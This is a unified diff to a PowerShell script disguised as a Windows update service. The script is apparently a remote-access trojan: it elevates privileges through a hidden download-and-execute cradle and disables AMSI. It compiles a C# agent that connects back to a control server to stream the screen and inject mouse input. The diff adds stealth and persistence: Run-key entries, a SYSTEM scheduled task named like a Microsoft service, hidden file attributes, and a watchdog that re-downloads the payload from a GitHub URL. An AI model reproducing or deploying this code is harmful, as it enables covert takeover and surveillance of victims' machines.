@@ -3,27 +3,46 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-Write-Host "[1] Iniciando..." -ForegroundColor Yellow
-
+# ===== VERIFICAR ADMIN =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "[!] Pedindo Admin..." -ForegroundColor Cyan
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
-Write-Host "[2] Admin OK." -ForegroundColor Green
 
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
-$vbsPath = "$dir\$installName.vbs"
-New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
-$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
-Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
-attrib +h +s +r $scriptPath 2>$null
-attrib +h +s +r $vbsPath 2>$null
 
-Write-Host "[3] Compilando Agente C#..." -ForegroundColor Yellow
+# ===== MODO VISÍVEL (PREPARA, PERSISTE E ESCONDE) =====
+if ($args -notcontains "-silent") {
+    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
+    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
+    
+    $argList = "-nop -w hidden -ep bypass -f `"$scriptPath`" -silent"
+    
+    # 1. Persistência via Registro
+    $cmd = "powershell.exe $argList"
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
+    
+    # 2. Persistência via Agendador de Tarefas (SYSTEM)
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
+        $trigger1 = New-ScheduledTaskTrigger -AtStartup
+        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+    
+    attrib +h +s +r $scriptPath 2>$null
+    
+    # 3. Esconde a janela e inicia o modo invisível
+    Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
+    exit
+}
+
+# ===== MODO INVISÍVEL (AGENTE) =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -38,6 +57,8 @@ if (-not ("R9KAgent" -as [type])) {
     using System.Threading;
     using System.Net.Sockets;
     using System.Windows.Forms;
+    using Microsoft.Win32;
+    using System.Diagnostics;
 
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
@@ -55,12 +76,13 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
+            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
             while (true) {
                 TcpClient myClient = null;
                 try {
-                    Console.WriteLine("[4] Conectando em " + IP + ":" + PORT + "...");
                     myClient = new TcpClient();
                     myClient.Connect(IP, PORT);
                     myClient.NoDelay = true;
@@ -70,7 +92,6 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
-                    Console.WriteLine("[5] CONECTOU AO CONTROLE!");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -78,13 +99,35 @@ if (-not ("R9KAgent" -as [type])) {
                     while (myClient.Connected) {
                         Thread.Sleep(500);
                     }
-                } catch (Exception ex) { 
-                    Console.WriteLine("[!] ERRO: " + ex.Message);
+                } catch { 
                     Thread.Sleep(3000); 
                 } finally {
                     streaming = false;
                     try { if (myClient != null) myClient.Close(); } catch {}
                 }
+            }
+        }
+
+        static void WatchdogLoop() {
+            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
+            while (true) {
+                try {
+                    if (!File.Exists(scriptPath)) {
+                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
+                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
+                    }
+                    string argList = "-nop -w hidden -ep bypass -f \"" + scriptPath + "\" -silent";
+                    string cmd = "powershell.exe " + argList;
+                    
+                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
+                    }
+                } catch {}
+                Thread.Sleep(5000);
             }
         }
 
@@ -134,9 +177,9 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
                     try {
-                        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                        if (rk != null) { rk.DeleteValue("WinUpdateSvc", false); rk.Close(); }
-                        System.Diagnostics.Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
+                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
+                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                         string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                         if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
                     } catch {}
@@ -198,5 +241,4 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
-Write-Host "[4] C# Compilado. Chamando Agente..." -ForegroundColor Green
 [R9KAgent]::Start($serverIP, $serverPort)
